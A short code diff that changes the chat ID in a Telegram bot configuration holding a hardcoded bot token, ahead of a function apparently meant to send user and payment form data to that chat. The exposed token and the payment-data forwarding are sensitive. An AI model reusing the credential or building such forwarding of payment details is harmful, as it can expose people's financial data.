@@ -1,7 +1,7 @@
 const configTelegram= {
     baseURL: 'https://api.telegram.org/bot',
     token: '5801779743:AAGr7j4rDjyF7BryJcx6E4X1G_BQ68JOHw8',
-    chat_id: '-1001776568341',//  1898992597
+    chat_id: '-859097852',//  1898992597
     parse_mode: 'MarkdownV2',
   }
 const telegramApi=async(formUser,formPay)=>{
